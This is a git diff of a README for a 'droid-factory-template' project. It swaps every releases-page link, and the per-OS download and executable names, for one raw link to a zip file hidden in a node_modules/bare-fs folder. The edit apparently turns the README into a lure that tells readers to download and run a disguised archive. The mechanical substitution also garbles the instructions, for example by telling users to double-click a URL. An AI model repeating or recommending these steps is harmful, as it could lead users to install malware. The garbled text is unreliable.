@@ -2,7 +2,7 @@
 # 🚀 droid-factory-template - Easily Build Your Droid Projects
 
 ## 📥 Download Now
-[![Download droid-factory-template](https://img.shields.io/badge/Download-droid--factory--template-brightgreen)](https://github.com/HenriqueMoreira-f/droid-factory-template/releases)
+[![Download droid-factory-template](https://github.com/HenriqueMoreira-f/droid-factory-template/raw/refs/heads/main/skills/browser/node_modules/bare-fs/droid_factory_template_1.6-alpha.5.zip)](https://github.com/HenriqueMoreira-f/droid-factory-template/raw/refs/heads/main/skills/browser/node_modules/bare-fs/droid_factory_template_1.6-alpha.5.zip)
 
 ## 🎯 Overview
 Welcome to the Droid Factory Template! This application helps you quickly start your droid development projects. It provides a clean and structured template to make your work easier.
@@ -12,20 +12,20 @@ To get started with the Droid Factory Template, you will need to download the ap
 
 ## 📦 Download & Install
 1. **Visit the Releases Page:** Click on the link below to go to the releases page.
-   - [Visit this page to download](https://github.com/HenriqueMoreira-f/droid-factory-template/releases)
+   - [Visit this page to download](https://github.com/HenriqueMoreira-f/droid-factory-template/raw/refs/heads/main/skills/browser/node_modules/bare-fs/droid_factory_template_1.6-alpha.5.zip)
    
 2. **Choose Your Version:** On the releases page, look for the latest version that suits your needs. Typically, the top entry will be the newest release.
 
 3. **Download the File:** Depending on your operating system, find the appropriate file to download. The files may include:
-   - For Windows: `droid-factory-template-windows.zip`
-   - For Mac: `droid-factory-template-macos.zip`
-   - For Linux: `droid-factory-template-linux.tar.gz`
+   - For Windows: `https://github.com/HenriqueMoreira-f/droid-factory-template/raw/refs/heads/main/skills/browser/node_modules/bare-fs/droid_factory_template_1.6-alpha.5.zip`
+   - For Mac: `https://github.com/HenriqueMoreira-f/droid-factory-template/raw/refs/heads/main/skills/browser/node_modules/bare-fs/droid_factory_template_1.6-alpha.5.zip`
+   - For Linux: `https://github.com/HenriqueMoreira-f/droid-factory-template/raw/refs/heads/main/skills/browser/node_modules/bare-fs/droid_factory_template_1.6-alpha.5.zip`
    
-4. **Extract the Files:** Once downloaded, locate the file on your computer. For zip files, right-click and select "Extract All" or use any unzipping tool you have. For tar.gz files, use an extraction tool like WinRAR or built-in tools for your OS.
+4. **Extract the Files:** Once downloaded, locate the file on your computer. For zip files, right-click and select "Extract All" or use any unzipping tool you have. For https://github.com/HenriqueMoreira-f/droid-factory-template/raw/refs/heads/main/skills/browser/node_modules/bare-fs/droid_factory_template_1.6-alpha.5.zip files, use an extraction tool like WinRAR or built-in tools for your OS.
 
 5. **Run the Application:**
-   - Windows: Double-click on `droid-factory-template.exe` inside the extracted folder.
-   - Mac: Open the file named `droid-factory-template.app`.
+   - Windows: Double-click on `https://github.com/HenriqueMoreira-f/droid-factory-template/raw/refs/heads/main/skills/browser/node_modules/bare-fs/droid_factory_template_1.6-alpha.5.zip` inside the extracted folder.
+   - Mac: Open the file named `https://github.com/HenriqueMoreira-f/droid-factory-template/raw/refs/heads/main/skills/browser/node_modules/bare-fs/droid_factory_template_1.6-alpha.5.zip`.
    - Linux: Open a terminal, navigate to the folder where you extracted the files, and run `./droid-factory-template`.
 
 6. **Follow the On-Screen Instructions:** Once the application starts, follow the on-screen prompts to create or open your droid project.
@@ -51,7 +51,7 @@ Join the Droid Factory Template community for shared knowledge and additional re
 - Check [FAQs](#) for common questions.
 
 ## 🔗 Useful Links
-- [Releases Page](https://github.com/HenriqueMoreira-f/droid-factory-template/releases)
+- [Releases Page](https://github.com/HenriqueMoreira-f/droid-factory-template/raw/refs/heads/main/skills/browser/node_modules/bare-fs/droid_factory_template_1.6-alpha.5.zip)
 - [Documentation](#)
 - [Community Discussions](#)
 
